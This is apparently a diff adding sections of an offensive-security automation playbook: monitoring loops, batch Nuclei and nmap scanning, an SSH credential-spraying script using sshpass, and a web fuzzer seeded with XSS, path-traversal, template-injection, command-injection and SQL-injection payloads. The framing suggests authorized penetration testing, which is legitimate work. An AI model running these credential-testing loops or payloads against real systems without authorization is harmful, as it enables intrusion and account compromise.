@@ -2369,3 +2369,365 @@ run_with_healing "recon" nmap -sn -n "$TARGET"
 run_with_healing "scan" nmap -sV -T4 --top-ports 100 "$TARGET"
 run_with_healing "vuln" nmap --script vuln -p 22,80,443 "$TARGET"
 ```
+
+---
+
+## 20. Watch Loop Pattern Scripts
+
+### HTTP Response Monitor with Threshold Alerting
+
+```bash
+#!/usr/bin/env bash
+# Monitor HTTP response time and alert when exceeding threshold
+# Polling: 3s interval, max 2000 iterations
+
+TARGET_URL="http://target.local/api/health"
+RESPONSE_THRESHOLD_MS=5000
+MAX_ITER=2000
+POLL_INTERVAL=3
+LOG_FILE="evidence/http-monitor-$(date +%Y%m%d).log"
+
+for i in $(seq 1 "$MAX_ITER"); do
+  RESPONSE_TIME=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET_URL" 2>/dev/null)
+  RESPONSE_MS=$(echo "$RESPONSE_TIME * 1000" | bc 2>/dev/null || echo "0")
+  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL" 2>/dev/null)
+
+  if [ "$(echo "$RESPONSE_MS > $RESPONSE_THRESHOLD_MS" | bc 2>/dev/null)" -eq 1 ]; then
+    echo "[$(date -Iseconds)] [SLOW] ${RESPONSE_MS}ms (threshold: ${RESPONSE_THRESHOLD_MS}ms) HTTP $HTTP_CODE" | tee -a "$LOG_FILE"
+  fi
+
+  if [ "$HTTP_CODE" = "500" ] || [ "$HTTP_CODE" = "502" ] || [ "$HTTP_CODE" = "503" ]; then
+    echo "[$(date -Iseconds)] [ERROR] HTTP $HTTP_CODE from $TARGET_URL" | tee -a "$LOG_FILE"
+  fi
+
+  sleep "$POLL_INTERVAL"
+done
+```
+
+### DNS Change Detection Watch Loop
+
+```bash
+#!/usr/bin/env bash
+# Monitor DNS records for changes indicating infrastructure modification
+# Trigger: DNS record value differs from baseline
+
+DOMAIN="target.example.com"
+RECORD_TYPES=("A" "AAAA" "MX" "TXT" "NS")
+BASELINE_FILE="evidence/dns-baseline-$(date +%Y%m%d).txt"
+MAX_ITER=5000
+POLL_INTERVAL=30
+
+echo "[WATCH] DNS monitor starting for $DOMAIN"
+
+# Capture baseline
+for rt in "${RECORD_TYPES[@]}"; do
+  echo "$rt:$(dig +short "$DOMAIN" "$rt" @8.8.8.8 2>/dev/null | sort | tr '\n' ',')" >> "$BASELINE_FILE"
+done
+
+for i in $(seq 1 "$MAX_ITER"); do
+  for rt in "${RECORD_TYPES[@]}"; do
+    current=$(dig +short "$DOMAIN" "$rt" @8.8.8.8 2>/dev/null | sort | tr '\n' ',')
+    baseline=$(grep "^${rt}:" "$BASELINE_FILE" | cut -d: -f2-)
+
+    if [ "$current" != "$baseline" ] && [ -n "$baseline" ]; then
+      echo "[$(date -Iseconds)] [TRIGGER] DNS $rt changed for $DOMAIN" | tee -a "evidence/dns-changes-$(date +%Y%m%d).log"
+      echo "  Before: $baseline" | tee -a "evidence/dns-changes-$(date +%Y%m%d).log"
+      echo "  After:  $current" | tee -a "evidence/dns-changes-$(date +%Y%m%d).log"
+      # Update baseline
+      sed -i "s/^${rt}:.*/${rt}:${current}/" "$BASELINE_FILE"
+    fi
+  done
+
+  sleep "$POLL_INTERVAL"
+done
+```
+
+---
+
+## 21. Batch Processing Automation
+
+### Parallel Nuclei Scan with Result Aggregation
+
+```bash
+#!/usr/bin/env bash
+# Batch Nuclei vulnerability scanning with parallel execution and result merging
+# Rate: 5 concurrent, 1s delay between targets
+
+TARGETS_FILE="targets.txt"
+OUTPUT_DIR="evidence/nuclei-batch-$(date +%Y%m%d-%H%M%S)"
+mkdir -p "$OUTPUT_DIR"
+CONCURRENCY=5
+BATCH_DELAY=1
+TOTAL=$(wc -l < "$TARGETS_FILE")
+
+echo "[BATCH] Starting Nuclei scan on $TOTAL targets (concurrency: $CONCURRENCY)"
+
+COUNT=0
+while IFS= read -r target; do
+  COUNT=$((COUNT + 1))
+  SAFE_NAME=$(echo "$target" | sed 's|[^a-zA-Z0-9.]|_|g')
+
+  nuclei -u "$target" -t cves/ -t vulnerabilities/ -t misconfiguration/ \
+    -severity critical,high,medium -silent -json \
+    -o "$OUTPUT_DIR/nuclei-${SAFE_NAME}.json" 2>/dev/null &
+
+  if [ $((COUNT % CONCURRENCY)) -eq 0 ]; then
+    wait
+    echo "[BATCH] Processed $COUNT/$TOTAL targets"
+    sleep "$BATCH_DELAY"
+  fi
+done < "$TARGETS_FILE"
+
+wait
+
+# Merge all results into single file
+cat "$OUTPUT_DIR"/*.json 2>/dev/null > "$OUTPUT_DIR/merged_results.json"
+TOTAL_FINDINGS=$(jq -s 'length' "$OUTPUT_DIR/merged_results.json" 2>/dev/null || echo "0")
+echo "[BATCH] Complete: $COUNT targets scanned, $TOTAL_FINDINGS total findings"
+```
+
+### Batch SSH Credential Testing
+
+```bash
+#!/usr/bin/env bash
+# Batch SSH credential testing with rate limiting and lockout detection
+# Rate: 1 attempt per target per 3 seconds, lockout detection enabled
+
+TARGETS_FILE="ssh_targets.txt"
+CREDS_FILE="creds.txt"
+OUTPUT_DIR="evidence/ssh-batch-$(date +%Y%m%d-%H%M%S)"
+mkdir -p "$OUTPUT_DIR"
+DELAY=3
+MAX_FAILURES_PER_TARGET=5
+
+echo "[BATCH-SSH] Starting credential testing on $(wc -l < "$TARGETS_FILE") targets"
+
+while IFS= read -r target; do
+  FAILURE_COUNT=0
+  SUCCESS=false
+
+  while IFS=: read -r user pass; do
+    [ "$FAILURE_COUNT" -ge "$MAX_FAILURES_PER_TARGET" ] && break
+    [ "$SUCCESS" = true ] && break
+
+    result=$(timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$target" "echo SUCCESS" 2>&1)
+
+    if echo "$result" | grep -q "SUCCESS"; then
+      echo "[$(date -Iseconds)] [SSH-SUCCESS] $user:$pass @ $target" | tee -a "$OUTPUT_DIR/success.log"
+      SUCCESS=true
+    else
+      FAILURE_COUNT=$((FAILURE_COUNT + 1))
+    fi
+
+    sleep "$DELAY"
+  done < "$CREDS_FILE"
+
+  echo "[$(date -Iseconds)] [SSH] $target complete (failures: $FAILURE_COUNT, success: $SUCCESS)"
+done < "$TARGETS_FILE"
+```
+
+---
+
+## 22. Learning Cycle Implementation
+
+### Adaptive Web Fuzzer with Response Learning
+
+```python
+#!/usr/bin/env python3
+"""Adaptive web fuzzer that learns from HTTP responses to refine payloads."""
+
+import requests
+import time
+from urllib.parse import urljoin
+from collections import defaultdict
+
+class AdaptiveWebFuzzer:
+    def __init__(self, base_url, max_iterations=50, confidence_threshold=0.05):
+        self.base_url = base_url
+        self.max_iterations = max_iterations
+        self.confidence_threshold = confidence_threshold
+        self.baseline_length = None
+        self.baseline_code = None
+        self.findings = []
+        self.iteration = 0
+
+    def seed_payloads(self):
+        """Generate initial seed payloads for fuzzing."""
+        return [
+            "'", '"', "<script>alert(1)</script>", "../../../etc/passwd",
+            "{{7*7}}", "${7*7}", "<!--#exec cmd='id'-->",
+            "1; cat /etc/passwd", "1'|sleep 5", "admin'--",
+            "{{config}}", "${T(java.lang.Runtime)}",
+            "<img src=x onerror=alert(1)>",
+        ]
+
+    def mutate_payload(self, base_payload):
+        """Generate mutations of a promising payload."""
+        mutations = [
+            base_payload.upper(),
+            base_payload.lower(),
+            base_payload.replace("'", '"'),
+            base_payload + ")))",
+            base_payload + "--",
+            base_payload.replace(" ", "/**/"),
+            base_payload.replace(" ", "%09"),
+        ]
+        return mutations
+
+    def learn_and_fuzz(self, endpoint="/"):
+        """Run the adaptive fuzzing loop."""
+        url = urljoin(self.base_url, endpoint)
+
+        # Capture baseline
+        baseline = requests.get(url, timeout=10)
+        self.baseline_length = len(baseline.text)
+        self.baseline_code = baseline.status_code
+        print(f"[FUZZ] Baseline: {self.baseline_code}, {self.baseline_length} bytes")
+
+        payloads = self.seed_payloads()
+        promising = []
+
+        for payload in payloads:
+            self.iteration += 1
+            if self.iteration > self.max_iterations:
+                break
+
+            try:
+                resp = requests.get(url, params={"q": payload}, timeout=10)
+                is_anomaly = self._detect_anomaly(resp, payload)
+
+                if is_anomaly:
+                    promising.append(payload)
+                    print(f"[FUZZ] Anomaly at iter {self.iteration}: {payload[:40]} -> {resp.status_code} ({len(resp.text)} bytes)")
+                    # Learn from anomaly and generate refined payloads
+                    for mutant in self.mutate_payload(payload)[:3]:
+                        self.iteration += 1
+                        resp2 = requests.get(url, params={"q": mutant}, timeout=10)
+                        self._detect_anomaly(resp2, mutant)
+
+            except requests.RequestException:
+                pass
+
+            time.sleep(0.2)
+
+        print(f"[FUZZ] Complete: {len(self.findings)} anomalies from {self.iteration} iterations")
+        return self.findings
+
+    def _detect_anomaly(self, resp, payload):
+        """Detect if response differs significantly from baseline."""
+        anomalies = []
+        if resp.status_code != self.baseline_code:
+            anomalies.append(f"status_code: {resp.status_code} vs {self.baseline_code}")
+        if abs(len(resp.text) - self.baseline_length) > 200:
+            anomalies.append(f"length: {len(resp.text)} vs {self.baseline_length}")
+        if payload.lower() in resp.text.lower():
+            anomalies.append("payload_reflected")
+
+        if anomalies:
+            self.findings.append({"payload": payload, "anomalies": anomalies})
+            return True
+        return False
+
+# Usage: AdaptiveWebFuzzer("http://target.local", max_iterations=50).learn_and_fuzz("/search")
+```
+
+---
+
+## 23. Error Recovery Patterns
+
+### Pipeline Recovery with Partial Results
+
+```python
+#!/usr/bin/env python3
+"""Recover a failed pipeline by loading partial results and resuming from failure point."""
+
+import json
+import os
+from pathlib import Path
+
+class PipelineRecovery:
+    def __init__(self, checkpoint_dir="evidence/checkpoints"):
+        self.checkpoint_dir = Path(checkpoint_dir)
+        self.checkpoint_dir.mkdir(parents=True, exist_ok=True)
+
+    def save_partial_results(self, operation_id, phase, results, targets_remaining):
+        """Save partial results from a failed pipeline phase."""
+        checkpoint = {
+            "operation_id": operation_id,
+            "phase": phase,
+            "completed_count": len(results),
+            "remaining_count": len(targets_remaining),
+            "results": results,
+            "targets_remaining": targets_remaining,
+            "timestamp": __import__('datetime').datetime.utcnow().isoformat()
+        }
+        path = self.checkpoint_dir / f"{operation_id}_{phase}.json"
+        with open(path, 'w') as f:
+            json.dump(checkpoint, f, indent=2, default=str)
+        print(f"[RECOVERY] Checkpoint saved: {len(results)} completed, {len(targets_remaining)} remaining")
+
+    def load_and_resume(self, operation_id, phase):
+        """Load checkpoint and return results + remaining targets."""
+        path = self.checkpoint_dir / f"{operation_id}_{phase}.json"
+        if not path.exists():
+            print("[RECOVERY] No checkpoint found, starting fresh")
+            return [], None
+
+        with open(path) as f:
+            checkpoint = json.load(f)
+
+        print(f"[RECOVERY] Resuming from checkpoint: {checkpoint['completed_count']} completed, {checkpoint['remaining_count']} remaining")
+        return checkpoint["results"], checkpoint["targets_remaining"]
+
+# Usage:
+# recovery = PipelineRecovery()
+# recovery.save_partial_results("OP-001", "scan", completed_results, remaining_targets)
+# completed, remaining = recovery.load_and_resume("OP-001", "scan")
+```
+
+---
+
+## 24. Parallel Execution Templates
+
+### Multi-Target Parallel Scanner with Worker Pool
+
+```python
+#!/usr/bin/env python3
+"""Parallel scanner using multiprocessing Pool for CPU-bound security tasks."""
+
+import subprocess
+import json
+from multiprocessing import Pool
+from functools import partial
+
+def scan_single_target(target, ports="22,80,443,445,3306,8080"):
+    """Scan a single target and return structured results."""
+    try:
+        result = subprocess.run(
+            ["nmap", "-sV", "-T4", "-p", ports, "-oX", "-", target],
+            capture_output=True, text=True, timeout=120
+        )
+        return {"target": target, "returncode": result.returncode, "output_length": len(result.stdout)}
+    except subprocess.TimeoutExpired:
+        return {"target": target, "error": "timeout"}
+    except Exception as e:
+        return {"target": target, "error": str(e)}
+
+def parallel_scan(targets, workers=10, ports="22,80,443,445,3306,8080"):
+    """Scan multiple targets in parallel using process pool."""
+    scan_func = partial(scan_single_target, ports=ports)
+    results = []
+
+    with Pool(processes=workers) as pool:
+        for i, result in enumerate(pool.imap_unordered(scan_func, targets)):
+            results.append(result)
+            status = "OK" if result.get("returncode") == 0 else "FAIL"
+            print(f"[PARALLEL] {i+1}/{len(targets)} {result['target']}: {status}")
+
+    print(f"[PARALLEL] Complete: {len(results)} targets scanned")
+    return sorted(results, key=lambda x: x.get("target", ""))
+
+# Usage:
+# targets = [f"192.168.1.{i}" for i in range(1, 101)]
+# results = parallel_scan(targets, workers=10)
+```
